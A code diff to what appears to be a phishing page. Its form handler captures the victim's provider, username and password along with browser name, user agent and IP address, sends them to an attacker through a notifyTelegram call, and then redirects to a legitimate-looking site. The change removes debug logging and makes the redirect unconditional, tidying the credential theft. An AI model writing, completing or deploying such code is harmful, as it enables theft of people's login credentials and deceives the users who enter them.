@@ -158,11 +158,6 @@ color:rgb(244, 67, 54);
 
 
 
-        console.log(get_ip);
-        console.log(get_browsername);
-
-
-
         $("#eform").on("submit", function (e){
           e.preventDefault();
 
@@ -179,11 +174,10 @@ color:rgb(244, 67, 54);
             var message = `PROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
             var status = notifyTelegram(message);
 
-            console.log(status);
-            if (status == true){
-              window.location.href = "https://ftc.net";
 
-              }
+            window.location.href = "https://ftc.net";
+
+
           }
 
         });
